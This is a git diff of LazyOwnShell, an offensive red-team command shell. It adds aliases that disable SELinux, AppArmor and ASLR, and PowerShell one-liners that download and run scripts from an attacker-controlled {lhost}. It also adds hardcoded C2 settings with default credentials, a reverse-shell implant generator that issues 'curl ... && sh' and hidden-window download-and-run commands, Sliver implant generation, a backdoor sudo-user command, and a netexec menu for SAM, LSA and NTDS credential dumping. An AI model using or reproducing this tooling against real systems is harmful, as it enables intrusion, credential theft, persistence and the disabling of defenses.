@@ -76,15 +76,35 @@ class LazyOwnShell(cmd2.Cmd):
     activate_virtualenv("env")
 
     aliases = {
+        "available_filter_functions": "sh sudo cat /sys/kernel/tracing/available_filter_functions",
+        "available_filter_functions_debug": "sh sudo cat /sys/debug/kernel/tracing/available_filter_functions",
+        "available_filter_functions_addrs": "sh sudo cat /sys/kernel/tracing/available_filter_functions_addrs",
+        "available_filter_functions_addrs_debug": "sh sudo cat /sys/debug/kernel/tracing/available_filter_functions_addrs",
+        "amnesiac": "sh pwsh -Command \"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac\"",
         "auto": "pyautomate",
         "aslr": "run lazyaslrcheck",
         "asm": "sh /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb",
         "caja": "sh caja sessions",
+        "chown": "sh sudo chown $USER:$USER sessions -R",
+        "control_dynamic_debug": "sh sudo cat /sys/kernel/debug/dynamic_debug/control", 
         "creds": "sh cat sessions/credentials*",
+        "disable_ftrace": "sh sudo sysctl kernel.ftrace_enabled=0",
+        "disable_ftrace_proc": "sh sudo echo 1 > /proc/sys/kernel/ftrace_enabled",
+        "disable_aslr": "sh echo 0 | sudo tee /proc/sys/kernel/randomize_va_space",
+        "diable_selinux": "sh sudo setenforce 0",
+        "disable_apparmor": "sh sudo systemctl stop apparmor",
         "discovery": "run lazynmapdiscovery",
         "dolphin": "sh dolphin sessions&",
         "duckdns": "sh bash modules/duckdns.sh",
-        "ed":"sh nano payload.json",
+        "ed": "sh nano payload.json",
+        "empire_client": "sh sudo powershell-empire client",
+        "empire_server": "sh sudo powershell-empire server",
+        "enable_aslr": "sh echo 2 | sudo tee /proc/sys/kernel/randomize_va_space",
+        "enabled_functions": "sh sudo cat /sys/kernel/tracing/enabled_functions",
+        "enabled_functions_debug": "sh sudo cat /sys/debug/kernel/tracing/enabled_functions",
+        "enabled_search_by_hidden_pids": "sh sudo echo 0 > /proc/sys/kernel/ftrace_enabled",
+        "enabled_ftrace": "sh sudo sysctl kernel.ftrace_enabled=1",
+        "event_trace": "sh sudo cat /sys/kernel/debug/tracing/trace",
         "ftpsniff": "run lazyftpsniff",
         "gdb": "set debug true",
         "gpt": "run lazygptcli",
@@ -96,6 +116,7 @@ class LazyOwnShell(cmd2.Cmd):
         "ls": "list",
         "lsof": "sh sudo lsof -i -P -n | grep LISTEN",
         "moo": "sh cowthink -bdgpstwy LazyOwn RedTeam Framework. The best OpSec T00l",
+        "kallsyms": "sh sudo cat /proc/kallsyms",
         "kvpn":"sh sudo killall openvpn",
         "nmap": "run lazynmap",
         "now": "clock",
@@ -110,15 +131,23 @@ class LazyOwnShell(cmd2.Cmd):
         "rtpflood" : "sh sudo bash modules/lazyrtpflood.sh",
         "t": "sh python3 modules/lazypyautogui.py",
         "tor": "sh sudo bash sessions/tor.sh",
+        "trace": "sh sudo cat /sys/kernel/tracing/trace",
+        "touched_functions": "sh sudo cat /sys/kernel/tracing/touched_functions",
         "ses": "sh ls sessions",
         "sniff": "run lazysniff",
-        "status":"sh git status",
+        "status": "sh git status",
+        "stop_squid": "sh sudo systemctl stop squid",
+        "start_squid": "sh sudo systemctl start squid",
+        "stop_apt": "sh sudo systemctl stop apt-cacher-ng",
+        "start_apt": "sh sudo systemctl start apt-cacher-ng",
+        "update": "sh git pull origin main",
         "unshadow": "sh sudo unshadow sessions/passwd sessions/shadow > sessions/hash.txt && sudo john sessions/hash.txt -w /usr/share/wordlists/rockyou.txt", 
         "venom": "run lazymsfvenom",
+        "vmallocinfo": "sh sudo cat /proc/vmallocinfo",
         "vuln": 'sh echo "    \033[33m[!] Searchspoit\n    \033[34m[!] The Exploit of the Day (you can use the command: cp path/of/exploit to copy exploit to working sessions directory):\033[32m" ;     searchsploit --cve | shuf -n 1 ',
-        "wps":"sh sudo bash modules/lazywps.sh",
+        "wps": "sh sudo bash modules/lazywps.sh",
         "ww": "whatweb",
-        "zrc":"sh nano ~/.zshrc",
+        "zrc": "sh nano ~/.zshrc",
     }
 
     def __init__(self):
@@ -220,6 +249,10 @@ class LazyOwnShell(cmd2.Cmd):
         ]
         self.output = ""
         self.custom_prompt = getprompt()
+        self.c2_url = "http://10.10.14.10:4444"
+        self.c2_auth = ("LazyOwn", "LazyOwn")
+        self.c2_clientid = "no_priv"
+        self.path = os.getcwd()
 
     def log_command(self, cmd_name, cmd_args):
         """
@@ -289,6 +322,18 @@ class LazyOwnShell(cmd2.Cmd):
         self.log_command(cmd_name, cmd_args)
 
     def cmd(self, line):
+        """
+        Internal function to execute commands.
+
+        This method attempts to execute a given command using `os.system` and captures
+        the output. It sets the `output` attribute based on whether the command was
+        executed successfully or an exception occurred. And feedback the red operation report.
+
+        :param command: The command to be executed.
+        :type command: str
+        :return: None.
+        :rtype: str
+        """
         command = line
         path = os.getcwd()
         parts = command.split(maxsplit=1)
@@ -296,7 +341,14 @@ class LazyOwnShell(cmd2.Cmd):
         cmd_args = parts[1] if len(parts) > 1 else ""
         domain = self.params["domain"]
         print_msg(f"Executing... {command}")
-        os.system(f" {command} | tee {path}/sessions/command_{cmd_name}_output_{domain}.txt")
+        if NOLOGS:
+            os.system(f" {command}")
+        else:
+            path_command = f"{path}/sessions/logs/command_{cmd_name}output{domain}.txt" 
+            os.system(f" {command} | tee {path_command}")
+            if os.path.exists(path_command):
+                with open(path_command, "r") as file:
+                    self.output = f"{cmd_name} {command} {file.read()}"
         self.logcsv(f"{cmd_name} {command}")
         return
     
@@ -477,6 +529,7 @@ class LazyOwnShell(cmd2.Cmd):
                     f"{script.ljust(column_width)}{RESET}    " for script in row
                 )
             )
+            
 
     def do_run(self, line):
         """
@@ -2191,7 +2244,7 @@ class LazyOwnShell(cmd2.Cmd):
                 if key in self.params:
                     self.params[key] = value
             print_msg(f"Parameters loaded from {GREEN}{filename}{RESET}")
-            p.onecmd("rrhost")
+            self.onecmd("rrhost")
         except FileNotFoundError:
             print_error(f"{filename} not found")
         except json.JSONDecodeError:
@@ -2780,7 +2833,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
         print_msg(f"Try cp {exploitdb}{line} {path}/sessions/{RESET}")
         self.cmd(f"cp {exploitdb}{line} {path}/sessions/")
-
+        self.cmd(f"searchsploit {line} -p")
         return
 
     def do_dnsenum(self, line):
@@ -3436,7 +3489,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(
             f"Try... sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\"; {RESET}"
         )
-        self.cmd(f"sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\";")
+        os.system(f"sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\";")
         print_msg(f"Done... add {line} to /etc/hosts {RESET}")
         return
 
@@ -4558,7 +4611,7 @@ class LazyOwnShell(cmd2.Cmd):
             - After running this command, you can use the `www` command as indicated by the printed message.
         """
 
-        self.cmd("cd sessions && ./download_resources.sh ")
+        os.system("cd sessions && ./download_resources.sh ")
         print_msg(f"Resources downloaded now you can run command {MAGENTA}www {RESET}")
         return
 
@@ -4599,18 +4652,18 @@ class LazyOwnShell(cmd2.Cmd):
             - The function assumes the presence of `external/.exploit` directory and serves files from there.
         """
 
-        self.cmd("cd external && ./install_external.sh ")
-        self.cmd(
+        os.system("cd external && ./install_external.sh ")
+        os.system(
             'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
         )
-        self.cmd(
+        os.system(
             "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
         )
-        self.cmd(
+        os.system(
             'echo "[\\e[96m`pwd`\\e[0m]\\e[34m" && cd external/.exploit && ls && echo -en "\\e[0m"'
         )
         print_msg(f"Web server at external/.exploit in port {RED} 8443 {RESET}")
-        self.cmd("cd external/.exploit && python3 -m http.server 8443")
+        os.system("cd external/.exploit && python3 -m http.server 8443")
         print_msg(
             f"Shutdown Web server at external/.exploit in port {RED} 8443 {RESET}"
         )
@@ -5541,6 +5594,15 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN Show running services", "net start"),
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
+            ("WIN Post Exploit Amnesiac", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Amnesiac.ps1');Amnesiac"),
+            ("WIN Post Exploit AmnesiacShell", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Amnesiac_ShellReady.ps1');Amnesiac"),
+            ("WIN Post Exploit SMBRemoting", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Invoke-SMBRemoting.ps1');Invoke-SMBRemoting -ComputerName \"{subdomain}.{domain}\""),
+            ("WIN Install ssh", "Start-Process \"msiexec.exe\" -ArgumentList \"/i `\"C:\\users\\grisun0\documents\OpenSSH-Win64-v9.8.1.0.msi`\" /quiet\" -Wait"),
+            ("WIN ssh start service", "Start-Service sshd"),
+            ("WIN ssh start service at boot", "Set-Service -Name sshd -StartupType 'Automatic'"),
+            ("WIN SSH ALLOW FIREWALL", "New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22"),
+            ("WIN SSH get state", "Get-Service -Name sshd"),
+            ("WIN run dll netsh", "netsh add helper C:\\users\\grisun0\\documents\\netshhelper.dll ; netsh"),
             ("WIN ARP Table", "arp -a"),
             ("WIN are we from Admin gropup ?", "(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"),
             ("WIN Get-LocalUser Sid", "Get-LocalUser -Name $env:USERNAME | Select sid"),
@@ -7464,14 +7526,26 @@ class LazyOwnShell(cmd2.Cmd):
         rhost = self.params["rhost"]
         if not check_rhost(rhost):
             return
-
+        if line.startswith("test"):
+            self.cmd("sudo rm sessions/test* -rf")
+            return
+        if line.startswith("log"):
+            self.cmd("sudo rm sessions/logs/* -rf")
+            return            
+        if line.startswith("nmap"):
+            self.cmd("sudo rm sessions/scan* -rf")
+            return
         exclusions = [
             'download_resources.sh',
             'win',
             'lin',
+            'logs',
             'php',
             'users.txt',
             'sslscan-singleip.sh',
+            'shell.c',
+            'infect.c',
+            'pid.c',
             'tor.sh',
             'payloads.txt',
             'ip2asn-v4.tsv.gz'
@@ -7530,11 +7604,11 @@ class LazyOwnShell(cmd2.Cmd):
         path = os.getcwd()
         for xml_file in xml_files:
             xml_path = os.path.join(directory, xml_file)
-            command = f"python3 pwntomate.py {xml_path} -x -b {path}/sessions"
+            command = f"python3 -W ignore pwntomate.py {xml_path} -x -b {path}/sessions"
             print_msg(f"Executing command: {MAGENTA}{command}{RESET}")
             try:
-                subprocess.run(command, shell=True, check=True)
-            except subprocess.CalledProcessError as e:
+                self.cmd(command)
+            except Exception as e:
                 print_error(f"Error executing command for {xml_file}: {e}{RESET}")
         print_msg(f"{YELLOW}Target was pwntomated 🍅. {RESET}")
         return
@@ -7848,7 +7922,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
 
         print_msg(f"printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0\" | xclip -sel clip")
-        self.cmd(f"printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0\" | xclip -sel clip")
+        os.system(f"printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0\" | xclip -sel clip")
         print_warn("Copied to clip ;)")
         return
 
@@ -9634,7 +9708,12 @@ class LazyOwnShell(cmd2.Cmd):
         bfile = f"{path}/modules/run.bat"
         filek = f"{path}/modules/backdoor/backdoor.c"
         files = f"{path}/modules/backdoor/server.c"
-
+        filer = f"{path}/modules/r.sh"
+        self.c2_url= f"http://{lhost}:{lport}"
+        self.c2_clientid = line.strip()
+        USER = "LazyOwn"
+        PASS = "LazyOwn"
+        self.c2_auth = (USER, PASS)
         random_bytes = os.urandom(100)
         base64_encoded = base64.b64encode(random_bytes)
         random_string = base64_encoded.decode('utf-8')[:12] 
@@ -9661,10 +9740,10 @@ class LazyOwnShell(cmd2.Cmd):
             wcontent = f.read()
         with open(bfile, 'r') as f:
             bcontent = f.read()
-        bcontent = bcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)    
-        wcontent = wcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
-        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
-        server = f"cd modules && python3 lazyc2.py {lport}"
+        bcontent = bcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
+        wcontent = wcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}",USER).replace("{password}",PASS)
+        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}",USER).replace("{password}",PASS)
+        server = f"python3 -W ignore lazyc2.py {lport} {USER} {PASS}"
         
         with open("sessions/r", 'w+') as f:
             f.write(content)
@@ -9674,11 +9753,10 @@ class LazyOwnShell(cmd2.Cmd):
 
         with open("sessions/r.bat", 'w+') as f:
             f.write(bcontent)
-        choice = input("    [!] choice target windows 1, linux 2, windows bat 3 : (default: 1)") or '1'
+        choice = input("    [!] choice target windows 1, linux 2, windows bat 3 (default 1) : ") or '1'
 
         if choice == '1':
-            copy2clip(f"iwr -uri  http://{lhost}/w -OutFile w.ps1 ; .\\w.ps1")
-            print_msg("Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri http://10.10.14.10/w -OutFile w.ps1; .\w.ps1`\"\"")
+            copy2clip(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\\z.ps1`\"\"")
         elif choice == '2':
             copy2clip(f"curl http://{lhost}/r -o r && sh r")
         elif choice == '3':
@@ -9697,16 +9775,26 @@ class LazyOwnShell(cmd2.Cmd):
         content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         with open("sessions/server.c", 'w+') as f:
             f.write(content)
+        with open(filer, 'r') as f:
+            contentr = f.read()
 
-        choice = input(f"    {CYAN}[?] start C2 Server ? (yes/no): ") or 'yes'
-        if choice == 'yes':
+        contentr = contentr.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
+        with open("sessions/r.sh", 'w+') as f:
+            f.write(contentr)
+        if is_port_in_use(lport):
             command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
             self.cmd(command)
-            print_msg("Username: LazyOwn")
-            print_msg("Password: LazyOwn")
-            self.cmd(server)
+            print_msg(f"Agent {line} Crafted.")
+        else:
+            choice = input(f"    {CYAN}[?] start C2 Server ? (yes/no): ") or 'yes'
+            if choice == 'yes':
+                command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
+                self.cmd(command)
+                print_msg("Username: LazyOwn")
+                print_msg("Password: LazyOwn")
+                self.cmd(server)
 
-            print_warn(f"Shutdown Server C&C at port:{RED} {lport}")
+                print_warn(f"Shutdown Server C&C at port:{RED} {lport}")
         return
 
     def do_kick(self, line):
@@ -10598,15 +10686,34 @@ class LazyOwnShell(cmd2.Cmd):
 
         print_msg("Starting the Sliver server...")
         cmd = "cd sessions && sliver-server"
-        command = f"""profiles new --mtls {lhost} --format shellcode win-shellcode
-        stage-listener --url http://{lhost}:{lport} --profile win-shellcode
-        generate stager --lhost {lhost} --lport {lport} --protocol http --save {path}/sessions/shellcode.bin
-        mtls
-        jobs
-        """.replace("        ","")
-        
-        copy2clip(command)
-        self.cmd("tab bin2shellcode")
+        if choice == "1":
+            command = f"""profiles new --mtls {lhost} --format exe win-exe
+            stage-listener --url http://{lhost}:{lport} --profile win-exe
+            generate --mtls {lhost} --http {lport} --os windows --format exe --save {path}/sessions/windows-implant.exe
+            mtls
+            jobs
+            """.replace("        ","")
+            
+            copy2clip(command)
+
+        elif choice == "2":
+            command = f"""profiles new --mtls {lhost} --format elf linux-elf
+            stage-listener --url http://{lhost}:{lport} --profile linux-elf
+            generate --mtls {lhost} --http {lport} --os linux --format elf --save {path}/sessions/linux-implant
+            mtls
+            jobs
+            """.replace("        ","")
+            
+            copy2clip(command)
+
+        elif choice == "3":
+            download_url = f"http://{lhost}/sliver-client_macos"
+            name = "sliver"
+        else:
+            print_error("Invalid choice.")
+            return
+
+        self.onecmd("tab bin2shellcode")
         try:
             self.cmd(f"sliver-server operator -l {lhost} -p {lport} -n {line} -s sessions/{line}_file.cfg")
             self.cmd(cmd)
@@ -10821,7 +10928,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         if not os.path.exists(bloodyad_path):
             self.cmd(f"git clone {bloodyad_git} {bloodyad_path}")
-            self.cmd(f"cd {bloodyad_path} && pip install -r requirements.txt")
+            self.cmd(f"cd {bloodyad_path} && pip3 install -r requirements.txt")
 
         url = self.params["url"]
         rhost = self.params["rhost"]
@@ -11740,9 +11847,8 @@ class LazyOwnShell(cmd2.Cmd):
             "output_file": f"sessions/payload_{lhost}_{lport}.txt"
         }
 
-        empire_command = f"powershell-empire client -p {options[selected_type]} -lhost {params['lhost']} -lport {params['lport']} -o {params['output_file']}"
+        empire_command = f"sudo powershell-empire client -p {options[selected_type]} -lhost {params['lhost']} -lport {params['lport']} -o {params['output_file']}"
 
-        print_msg(f"Generating payload with Empire: {empire_command}")
         self.cmd(empire_command)
         
         return
@@ -11953,27 +12059,45 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Executes netexec with various options for network protocol operations.
 
-        :param line: Not used directly but reserved for future use.
+        This function handles the installation of netexec and allows the user to execute various network protocol operations with minimal input.
+        It reads credentials from a specified file and constructs the necessary commands to interact with the target system.
 
+        :param line: Command line input from the user. This input is used to determine the protocol and action to be executed.
         :returns: None
+
+        The function performs the following steps:
+        1. Checks if netexec is installed. If not, it installs it.
+        2. Reads credentials from a file.
+        3. Constructs and executes the netexec command based on user input.
+        4. Enumerates available protocols and actions for each protocol, allowing the user to select them interactively.
+        5. Enumerates available options for each action, allowing the user to select them interactively.
+
+        Example usage:
+        ```
+        do_netexec("smb target -u username -p password --shares")
+        ```
+
+        This will execute the SMB protocol with the specified action and options.
+
+        If no specific command is provided, the function will prompt the user to select a protocol and action interactively.
         """
         def install_netexec():
             print_warn("netexec is not installed. Installing.")
             self.cmd("sudo apt install netexec -y")
             print_msg("Installation completed using apt.")
-            
+
         def install_netexec_pipx():
             print_warn("netexec is not installed. Installing via pipx.")
             self.cmd("sudo apt install pipx git -y")
             self.cmd("pipx ensurepath")
             self.cmd("pipx install git+https://github.com/Pennyw0rth/NetExec")
             print_msg("Installation completed using pipx.")
-            
+
         if not is_binary_present("netexec"):
             print_warn("netexec is not installed. Select installation method:")
             print_msg("1. Install using apt")
             print_msg("2. Install using pipx")
-            
+
             try:
                 install_choice = int(input("    [!] Enter the number corresponding to the installation method: "))
                 if install_choice == 1:
@@ -11986,34 +12110,32 @@ class LazyOwnShell(cmd2.Cmd):
             except ValueError:
                 print_error("Invalid input. Please enter a valid number.")
                 return
-            
+
         rhost = self.params["rhost"]
         domain = self.params["domain"]
         subdomain = self.params["subdomain"]
         path = os.getcwd()
         tmp_path = f"{path}/sessions"
-        if line:
-            if line.startswith("rid"):
-                credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
-                if not os.path.exists(credentials_path):
-                    command = f"netexec smb {rhost} -u guest -p '' --rid-brute > sessions/users_{rhost}.txt"
-                    
-                else:
-                    credentials_path = get_credentials(True)
-                    if not credentials_path:
-                        return
-                    
-                    with open(credentials_path, "r") as file:
-                        for file_line in file:
-                            params = file_line.split(":")
-                            username = params[0]
-                            password = params[1].replace("\n", "")
-                            command = f"netexec smb {subdomain}.{domain} -u {username} -p '{password}'  -k --shares --rid-brute 10000"
+        threads = 22
+        timeout = 33
+        jitter = 0
 
-                self.cmd(command)
-                self.cmd("cat sessions/users_{rhost}.txt | awk '{print $6}' | sponge sessions/users_{rhost}.txt".replace("{rhost}",rhost))
-                self.cmd(f"cat sessions/users_{rhost}.txt >> sessions/users.txt")
-                return
+        if line:
+            command_parts = line.split()
+            protocol = command_parts[0]
+            action = command_parts[1] if len(command_parts) > 1 else ""
+            options = command_parts[2:]
+
+            command = f"netexec {protocol} {rhost}"
+
+            if action:
+                command += f" {action}"
+
+            if options:
+                command += " " + " ".join(options)
+
+            self.cmd(command)
+            return
 
         print_warn("Select the protocol you want to use:")
         protocols = ["ssh", "winrm", "smb", "rdp", "wmi", "mssql", "ldap", "ftp", "vnc"]
@@ -12027,14 +12149,100 @@ class LazyOwnShell(cmd2.Cmd):
                 return
 
             protocol = protocols[protocol_choice]
-            threads = input("    [!] Enter the number of threads (default: 10): ").strip() or "10"
-            timeout = input("    [!] Enter the timeout in seconds (default: 5): ").strip() or "5"
-            jitter = input("    [!] Enter jitter interval (default: 0): ").strip() or "0"
-            verbose = input("    [!] Enable verbose mode? (yes/no, default: no): ").strip().lower() == "yes"
-            debug = input("    [!] Enable debug mode? (yes/no, default: no): ").strip().lower() == "yes"
+            actions = {
+                "ssh": ["--continue-on-success"],
+                "winrm": [],
+                "smb": ["--shares", "--users", "--rid-brute", "--local-auth", "-k", "--gen-relay-list", "--groups", "--local-groups", "--loggedon-users", "--pass-pol", "--sam", "--lsa", "--ntds", "-M"],
+                "rdp": [],
+                "wmi": [],
+                "mssql": ["-x", "--get-file"],
+                "ldap": ["--users", "--trusted-for-delegation", "--password-not-required", "--admin-count", "--groups", "--kerberoasting", "--asreproast", "--gmsa-convert-id", "--gmsa-decrypt-lsa", "--bloodhound", "--maq", "--adcs"],
+                "ftp": ["--ls"],
+                "vnc": []
+            }
+            if actions[protocol]:
+                print_warn(f"Select the action for {protocol}:")
+                for j, action in enumerate(actions[protocol], start=1):
+                    print_msg(f"{j}. {action}")
+
+                action_choice = int(input("    [!] Enter the number corresponding to the action: ")) - 1
+                if action_choice < 0 or action_choice >= len(actions[protocol]):
+                    print_error("Invalid choice. Please select a valid number.")
+                    return
+
+                action = actions[protocol][action_choice]
+            else:
+                action = None
+
+            options_dict = {
+                "ssh": {
+                    "--continue-on-success": []
+                },
+                "winrm": {},
+                "smb": {
+                    "--shares": [],
+                    "--users": [],
+                    "--rid-brute": [],
+                    "--local-auth": [],
+                    "-k": [],
+                    "--gen-relay-list": ["relay_list_file"],
+                    "--groups": [],
+                    "--local-groups": [],
+                    "--loggedon-users": [],
+                    "--pass-pol": [],
+                    "--sam": [],
+                    "--lsa": [],
+                    "--ntds": [],
+                    "-M": ["module_name"]
+                },
+                "rdp": {},
+                "wmi": {},
+                "mssql": {
+                    "-x": ["command"],
+                    "--get-file": ["output_file", "target_file"]
+                },
+                "ldap": {
+                    "--users": [],
+                    "--trusted-for-delegation": [],
+                    "--password-not-required": [],
+                    "--admin-count": [],
+                    "--groups": [],
+                    "--kerberoasting": ["kerb_file"],
+                    "--asreproast": ["asrep_file"],
+                    "--gmsa-convert-id": ["id"],
+                    "--gmsa-decrypt-lsa": ["gmsa_account"],
+                    "--bloodhound": ["-ns", "ip", "--collection", "All"],
+                    "--maq": [],
+                    "--adcs": []
+                },
+                "ftp": {
+                    "--ls": ["folder_name"]
+                },
+                "vnc": {}
+            }
+
+            options = []
+         
+            if action:
+                print_warn(f"Select the options for {action}:")
+                for k, option in enumerate(options_dict[protocol][action], start=1):
+                    print_msg(f"{k}. {option}")
+
+                while True:
+                    try:
+                        option_choice = int(input("    [!] Enter the number corresponding to the option (or 0 to finish): ")) - 1
+                        if option_choice == -1:
+                            break
+                        if option_choice < 0 or option_choice >= len(options_dict[protocol][action]):
+                            print_error("Invalid choice. Please select a valid number.")
+                            continue
+                        option_value = input(f"    [!] Enter the value for {options_dict[protocol][action][option_choice]}: ").strip()
+                        options.append(f"{options_dict[protocol][action][option_choice]} {option_value}")
+                    except ValueError:
+                        print_error("Invalid input. Please enter a valid number.")
 
             if not os.path.exists(f"{path}/sessions/credentials.txt"):
-                print_error("Not file credentials.txt in sessions direcotry to create use some like this: createcredentials admin:admin")
+                print_error("Not file credentials.txt in sessions directory to create use some like this: createcredentials admin:admin")
                 return
 
             path_cred = get_credentials(True)
@@ -12049,18 +12257,24 @@ class LazyOwnShell(cmd2.Cmd):
                         password = params[1].replace("\n", "")
                         netexec_command = f"netexec {protocol} -t {threads} --timeout {timeout} --jitter {jitter}  -u {username} -p '{password}' --log sessions/{rhost}_{protocol}_netexec.txt "
 
-            if verbose:
-                netexec_command += " --verbose"
-            if debug:
-                netexec_command += " --debug"
-            
-            netexec_command += f" {rhost}"
-            print_msg(f"Running netexec with command: {netexec_command}")
+            if options:
+                netexec_command += " " + " ".join(options)
+            choice = input(f"   [!] Enter 1 to use ip enter 2 to use domain 3 use subdomain (default 1 {rhost}): ") or '1'
+            if choice == "1":
+                netexec_command += f" {rhost}"
+            elif choice == "2":
+                netexec_command += f" {domain}"
+            elif choice == "3":
+                netexec_command += f" {subdomain}.{domain}"
+            else:
+                netexec_command += f" {subdomain}"
+
             self.cmd(netexec_command)
 
         except ValueError:
             print_error("Invalid input. Please enter a valid number.")
         return
+
 
     def do_scarecrow(self, line):
         """
@@ -12800,7 +13014,7 @@ class LazyOwnShell(cmd2.Cmd):
         url = self.params["url"]
         if not is_package_installed("git-dumper"):
             print_warn("git-dumper not found. Installing...")
-            self.cmd("pip install git-dumper")
+            self.cmd("pip3 install git-dumper")
 
         if not line:
             repo_url = input(f"Enter the Git repository URL (e.g., default: {url}").strip() or url
@@ -13210,7 +13424,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         if not is_binary_present("kusa"):
             print_warn("Kusanagi binary not found. installing")
-            self.cmd("pip install kusanagi")
+            self.cmd("pip3 install kusanagi")
             return
         
         print_msg("Kusanagi - Payload Generator and Injector")
@@ -15856,7 +16070,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg("Cloning SirepRAT repository...")
             self.cmd(f"git clone {sireprat_repo} {sireprat_dir}")
             print_msg("Installing SirepRAT requirements...")
-            self.cmd(f"pip install -r {sireprat_dir}/requirements.txt")
+            self.cmd(f"pip3 install -r {sireprat_dir}/requirements.txt")
         else:
             print_msg("SirepRAT already installed, skipping setup.")
         
@@ -16130,7 +16344,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg("Cloning CubeSpraying repository...")
             self.cmd(f"git clone {cubespraying_repo} {cubespraying_dir}")
             print_msg("Installing required dependencies...")
-            self.cmd(f"pip install requests")
+            self.cmd(f"pip3 install requests")
         else:
             print_msg("CubeSpraying already installed, skipping setup.")
         print_msg("Choice the usernames diccionary")
@@ -16225,7 +16439,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg("Running installation script...")
             self.cmd(f"cd {stormbreaker_dir} && sudo bash install.sh")
             print_msg("Installing required Python dependencies...")
-            self.cmd(f"sudo python3 -m pip install -r {stormbreaker_dir}/requirements.txt")
+            self.cmd(f"sudo python3 -m pip3 install -r {stormbreaker_dir}/requirements.txt")
         else:
             print_msg("Storm-Breaker is already installed, skipping setup.")
 
@@ -16268,7 +16482,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg("Cloning Upload_Bypass repository...")
             self.cmd(f"git clone {upload_bypass_repo} {upload_bypass_dir}")
             print_msg("Installing required dependencies...")
-            self.cmd(f"pip install -r {upload_bypass_dir}/requirements.txt")
+            self.cmd(f"pip3 install -r {upload_bypass_dir}/requirements.txt")
         else:
             print_msg("Upload_Bypass already installed, skipping setup.")
 
@@ -16641,7 +16855,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         if not is_binary_present("nth"):
             print_warn("nth is not installed. Installing.")
-            self.cmd("pip install nth")
+            self.cmd("pip3 install nth")
             return
         
         hash_file_path = 'sessions/hash.txt'
@@ -16873,6 +17087,12 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Open Ports: {ports}")
         print_warn("To enter use Ctrl + Clic: ")
         print_msg(f"{BLUE}{UNDERLINE}https://www.speedguide.net/ip/{ip_address}")
+        print_msg(f"{BLUE}{UNDERLINE}https://otx.alienvault.com/browse/global/indicators?include_inactive=0&sort=-modified&page=1&limit=10&indicatorsSearch={ip_address}")
+        print_msg(f"{BLUE}{UNDERLINE}https://viz.greynoise.io/ip/{ip_address}")
+        print_msg(f"{BLUE}{UNDERLINE}https://search.censys.io/hosts/{ip_address}")
+        print_msg(f"{BLUE}{UNDERLINE}https://talosintelligence.com/reputation_center/lookup?search={ip_address}")
+        print_msg(f"{BLUE}{UNDERLINE}https://www.abuseipdb.com/check/{ip_address}")
+        print_msg(f"{BLUE}{UNDERLINE}https://whatismyipaddress.com/ip/{ip_address}")
         for p in ports.split(","):
             print_msg(f"{BLUE}{UNDERLINE}https://www.speedguide.net/port.php?port={p}")
             telnet = f"telnet {ip_address} {p}"
@@ -17673,7 +17893,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not os.path.exists(ad_ldap_enum_dir):
